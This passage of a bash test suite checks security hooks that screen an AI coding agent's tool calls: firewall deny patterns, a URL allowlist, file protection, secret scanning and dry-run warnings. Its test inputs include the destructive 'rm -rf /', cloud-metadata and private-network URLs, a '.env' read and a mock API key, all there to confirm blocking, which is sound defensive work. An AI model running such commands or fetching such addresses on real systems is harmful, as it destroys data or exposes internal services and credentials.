# Dry-run mode: local pattern warns instead of blocking
DRY_OUT=$(echo '{"tool_input":{"command":"docker run ubuntu"}}' | HOME="$DRY_HOME" CLAUDE_FORGE_DRY_RUN=1 bash "$FW" 2>/dev/null)
if [[ "$DRY_OUT" == *"systemMessage"* && "$DRY_OUT" == *"DRY-RUN"* ]]; then
  printf '  %b[PASS]%b Dry-run: local pattern warns instead of blocking\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b Dry-run did not warn for local pattern: %s\n' "$RED" "$NC" "$DRY_OUT"
  FAIL=$((FAIL + 1))
fi

# Normal mode: local pattern blocks
NORMAL_LOCAL=$(echo '{"tool_input":{"command":"docker run ubuntu"}}' | HOME="$DRY_HOME" bash "$FW" 2>/dev/null)
if [[ "$NORMAL_LOCAL" == *"deny"* ]]; then
  printf '  %b[PASS]%b Normal mode: local pattern blocks\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b Normal mode did not block local pattern: %s\n' "$RED" "$NC" "$NORMAL_LOCAL"
  FAIL=$((FAIL + 1))
fi

export HOME="$ORIG_HOME"

echo ""

# --- bash-firewall.sh: Local patterns ---
echo "-- bash-firewall.sh: Local patterns --"

# Create temp local-patterns.sh
ORIG_HOME="$HOME"
TEST_HOME="$TMPDIR_TEST/home-local"
mkdir -p "$TEST_HOME/.claude"
printf 'LOCAL_DENY_PATTERNS=("\\bdocker\\s+run\\b")\nLOCAL_DENY_REASONS=("Docker run is blocked by local policy")\n' \
  >"$TEST_HOME/.claude/local-patterns.sh"

LOCAL_OUT=$(echo '{"tool_input":{"command":"docker run ubuntu"}}' | HOME="$TEST_HOME" bash "$FW" 2>/dev/null)
if [[ "$LOCAL_OUT" == *"deny"* && "$LOCAL_OUT" == *"Docker run"* ]]; then
  printf '  %b[PASS]%b Local pattern blocks docker run\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b Local pattern did not block docker run: %s\n' "$RED" "$NC" "$LOCAL_OUT"
  FAIL=$((FAIL + 1))
fi

# Without local-patterns, docker run is allowed
NOLOCAL_OUT=$(echo '{"tool_input":{"command":"docker run ubuntu"}}' | HOME="$TMPDIR_TEST/empty-home" bash "$FW" 2>/dev/null)
if [[ -z "$NOLOCAL_OUT" || "$NOLOCAL_OUT" != *"deny"* ]]; then
  printf '  %b[PASS]%b Without local patterns, docker run allowed\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b docker run unexpectedly blocked without local patterns: %s\n' "$RED" "$NC" "$NOLOCAL_OUT"
  FAIL=$((FAIL + 1))
fi

export HOME="$ORIG_HOME"

echo ""

# protect-files.sh dry-run: now warns instead of blocking (tested in dry-run section below)

echo ""

# --- bash-firewall.sh: Built-in patterns ignore dry-run ---
echo "-- bash-firewall.sh: Built-in ignores dry-run --"
DRY_BUILTIN_OUT=$(echo '{"tool_input":{"command":"rm -rf /"}}' | CLAUDE_FORGE_DRY_RUN=1 bash "$FW" 2>/dev/null)
if [[ "$DRY_BUILTIN_OUT" == *"deny"* ]]; then
  printf '  %b[PASS]%b Built-in rm -rf / blocks even with DRY_RUN=1\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b Built-in pattern bypassed by DRY_RUN: %s\n' "$RED" "$NC" "$DRY_BUILTIN_OUT"
  FAIL=$((FAIL + 1))
fi

echo ""

export HOME="$ORIG_HOME"

# --- smithery-context.sh ---
echo "-- smithery-context.sh --"
SC="$HOOKS_DIR/smithery-context.sh"

# smithery not installed → exit 0, no output
assert_exit "Exit 0 when smithery not installed" 0 "$SC" '{}'

# Valid UserPromptSubmit JSON input, no smithery in test ENV → exit 0
assert_exit "Exit 0 on valid prompt input" 0 "$SC" '{"prompt":"Hello","session_id":"s1"}'

# Mock smithery to verify additionalContext output format
_SC_MOCK_DIR="$TMPDIR_TEST/smithery-mock"
mkdir -p "$_SC_MOCK_DIR"
printf '%s\n' '#!/usr/bin/env bash' \
  'echo '"'"'{"total":1,"servers":[{"name":"my-server","id":"org/server","status":"connected"}]}'"'"'' \
  >"$_SC_MOCK_DIR/smithery"
chmod +x "$_SC_MOCK_DIR/smithery"
SC_OUT=$(echo '{}' | PATH="$_SC_MOCK_DIR:$PATH" bash "$SC" 2>/dev/null || true)
if [[ "$SC_OUT" == *"additionalContext"* && "$SC_OUT" == *"smithery_connected"* ]]; then
  printf '  %b[PASS]%b smithery-context: additionalContext with smithery_connected\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b smithery-context: missing additionalContext: %s\n' "$RED" "$NC" "$SC_OUT"
  FAIL=$((FAIL + 1))
fi
unset _SC_MOCK_DIR SC_OUT

echo ""

# --- url-allowlist.sh ---
echo "-- url-allowlist.sh --"
UA="$HOOKS_DIR/url-allowlist.sh"

# Non-WebFetch tool → pass through
assert_exit "Ignores non-WebFetch tool" 0 "$UA" '{"tool_name":"Read","tool_input":{"file_path":"/tmp/test"}}'

# Public URL → allowed
assert_exit "Allows public URL" 0 "$UA" '{"tool_name":"WebFetch","tool_input":{"url":"https://example.com/page"}}'
assert_exit "Allows github.com" 0 "$UA" '{"tool_name":"WebFetch","tool_input":{"url":"https://github.com/user/repo"}}'
assert_exit "Allows api.anthropic.com" 0 "$UA" '{"tool_name":"WebFetch","tool_input":{"url":"https://api.anthropic.com/v1/messages"}}'

# Private URLs → blocked
assert_exit "Blocks localhost" 0 "$UA" '{"tool_name":"WebFetch","tool_input":{"url":"http://localhost:8080/api"}}'
assert_exit "Blocks 127.0.0.1" 0 "$UA" '{"tool_name":"WebFetch","tool_input":{"url":"http://127.0.0.1/admin"}}'
assert_exit "Blocks 10.x.x.x" 0 "$UA" '{"tool_name":"WebFetch","tool_input":{"url":"http://10.0.0.1/internal"}}'
assert_exit "Blocks 172.16.x.x" 0 "$UA" '{"tool_name":"WebFetch","tool_input":{"url":"http://172.16.0.1/secret"}}'
assert_exit "Blocks 192.168.x.x" 0 "$UA" '{"tool_name":"WebFetch","tool_input":{"url":"http://192.168.1.1/config"}}'
assert_exit "Blocks 169.254.169.254 (metadata)" 0 "$UA" '{"tool_name":"WebFetch","tool_input":{"url":"http://169.254.169.254/latest/meta-data"}}'
assert_exit "Blocks .local domain" 0 "$UA" '{"tool_name":"WebFetch","tool_input":{"url":"http://myservice.local/api"}}'
assert_exit "Blocks .internal domain" 0 "$UA" '{"tool_name":"WebFetch","tool_input":{"url":"http://app.internal/status"}}'
assert_exit "Blocks .corp domain" 0 "$UA" '{"tool_name":"WebFetch","tool_input":{"url":"http://intranet.corp/wiki"}}'
assert_exit "Blocks .intranet domain" 0 "$UA" '{"tool_name":"WebFetch","tool_input":{"url":"http://portal.intranet/login"}}'
assert_exit "Blocks 0.0.0.0" 0 "$UA" '{"tool_name":"WebFetch","tool_input":{"url":"http://0.0.0.0:3000/"}}'

# Blocked URLs output deny JSON
UA_OUT=$(echo '{"tool_name":"WebFetch","tool_input":{"url":"http://localhost:3000/"}}' | bash "$UA" 2>/dev/null || true)
if [[ "$UA_OUT" == *"permissionDecision"*"deny"* ]]; then
  printf '  %b[PASS]%b url-allowlist: deny JSON for localhost\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b url-allowlist: expected deny JSON, got: %s\n' "$RED" "$NC" "$UA_OUT"
  FAIL=$((FAIL + 1))
fi

# Public URL → no deny output
UA_OUT=$(echo '{"tool_name":"WebFetch","tool_input":{"url":"https://example.com/"}}' | bash "$UA" 2>/dev/null || true)
if [[ -z "$UA_OUT" || "$UA_OUT" != *"deny"* ]]; then
  printf '  %b[PASS]%b url-allowlist: no deny for public URL\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b url-allowlist: unexpected deny for public URL: %s\n' "$RED" "$NC" "$UA_OUT"
  FAIL=$((FAIL + 1))
fi

# Empty URL → pass through
assert_exit "Allows empty URL" 0 "$UA" '{"tool_name":"WebFetch","tool_input":{"url":""}}'
unset UA_OUT

echo ""

# --- pre-write-backup.sh ---
echo "-- pre-write-backup.sh --"
PWB="$HOOKS_DIR/pre-write-backup.sh"

# Disabled by default → exit 0
assert_exit "Exit 0 when CLAUDE_FORGE_BACKUP unset" 0 "$PWB" '{"tool_name":"Write","tool_input":{"file_path":"/tmp/test.txt","content":"hello"}}'

# Non-Write/Edit tool → exit 0
CLAUDE_FORGE_BACKUP=1 assert_exit "Exit 0 for non-Write tool" 0 "$PWB" '{"tool_name":"Read","tool_input":{"file_path":"/tmp/test.txt"}}'

# /tmp/ files skipped
CLAUDE_FORGE_BACKUP=1 assert_exit "Skips /tmp/ files" 0 "$PWB" '{"tool_name":"Write","tool_input":{"file_path":"/tmp/test.txt","content":"hello"}}'

# node_modules/ files skipped
CLAUDE_FORGE_BACKUP=1 assert_exit "Skips node_modules/" 0 "$PWB" '{"tool_name":"Write","tool_input":{"file_path":"/home/user/project/node_modules/pkg/index.js","content":"x"}}'

# Non-existent file → no backup needed
CLAUDE_FORGE_BACKUP=1 assert_exit "Skips non-existent file" 0 "$PWB" '{"tool_name":"Write","tool_input":{"file_path":"/tmp/nonexistent_test_file_xyz.txt","content":"hello"}}'

echo ""

# --- protect-files.sh dry-run ---
echo "-- protect-files.sh: dry-run mode --"
PF="$HOOKS_DIR/protect-files.sh"

# Dry-run: .env should produce warning, not deny
PF_OUT=$(echo '{"tool_name":"Read","tool_input":{"file_path":"/home/user/.env"}}' | CLAUDE_FORGE_DRY_RUN=1 bash "$PF" 2>/dev/null || true)
if [[ "$PF_OUT" == *"DRY-RUN"* && "$PF_OUT" == *"systemMessage"* ]]; then
  printf '  %b[PASS]%b protect-files: dry-run warns instead of blocking\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b protect-files: dry-run should warn, got: %s\n' "$RED" "$NC" "$PF_OUT"
  FAIL=$((FAIL + 1))
fi
unset PF_OUT

echo ""

# --- secret-scan-pre.sh dry-run ---
echo "-- secret-scan-pre.sh: dry-run mode --"
SSP="$HOOKS_DIR/secret-scan-pre.sh"

# Build mock secret at runtime to avoid triggering our own secret scanner
_MOCK_SECRET="sk-ant-$(printf 'a%.0s' {1..30})"
_MOCK_JSON=$(jq -cn --arg s "$_MOCK_SECRET" '{"tool_name":"Write","tool_input":{"content":$s,"file_path":"/tmp/test.txt"}}')
SSP_OUT=$(echo "$_MOCK_JSON" | CLAUDE_FORGE_DRY_RUN=1 bash "$SSP" 2>/dev/null || true)
if [[ "$SSP_OUT" == *"DRY-RUN"* && "$SSP_OUT" == *"systemMessage"* ]]; then
  printf '  %b[PASS]%b secret-scan-pre: dry-run warns instead of blocking\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b secret-scan-pre: dry-run should warn, got: %s\n' "$RED" "$NC" "$SSP_OUT"
  FAIL=$((FAIL + 1))
fi
unset _MOCK_SECRET _MOCK_JSON SSP_OUT

echo ""

# --- lib.sh: hook metrics ---
echo "-- lib.sh: hook metrics --"
# Verify CLAUDE_FORGE_DEBUG=1 creates METRIC entries
_METRICS_HOME="$TMPDIR_TEST/metrics-test"
mkdir -p "$_METRICS_HOME/.claude"
echo '{}' | CLAUDE_FORGE_DEBUG=1 HOME="$_METRICS_HOME" bash "$HOOKS_DIR/session-start.sh" >/dev/null 2>/dev/null || true
if [[ -f "$_METRICS_HOME/.claude/hooks-debug.log" ]] && grep -q "METRIC" "$_METRICS_HOME/.claude/hooks-debug.log" 2>/dev/null; then
  printf '  %b[PASS]%b lib.sh: hook metrics logged when DEBUG=1\n' "$GREEN" "$NC"
  PASS=$((PASS + 1))
else
  printf '  %b[FAIL]%b lib.sh: no METRIC entry in debug log\n' "$RED" "$NC"
  FAIL=$((FAIL + 1))
fi
unset _METRICS_HOME METRIC_OUT

echo ""

# --- Ergebnis ---
echo "================================="
printf 'Tests: %d | %b%d passed%b | %b%d failed%b\n' $((PASS + FAIL)) "$GREEN" "$PASS" "$NC" "$RED" "$FAIL" "$NC"
[[ $FAIL -eq 0 ]] && exit 0 || exit 1
